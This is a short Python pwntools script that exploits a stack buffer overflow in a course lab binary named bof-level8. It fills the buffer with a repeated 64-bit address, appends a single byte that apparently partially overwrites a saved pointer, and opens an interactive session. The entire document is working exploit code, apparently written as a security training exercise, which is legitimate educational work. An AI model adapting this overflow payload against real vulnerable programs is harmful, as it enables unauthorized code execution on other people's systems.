#!/usr/bin/env python

from pwn import *

p = process('/home/labs/week2/bof-level8/bof-level8')

buffer = ""
for i in range(0,(128/8)):
	buffer += p64(0x000000000040067a)

buffer += "\x10"


p.sendline(buffer)
p.interactive()
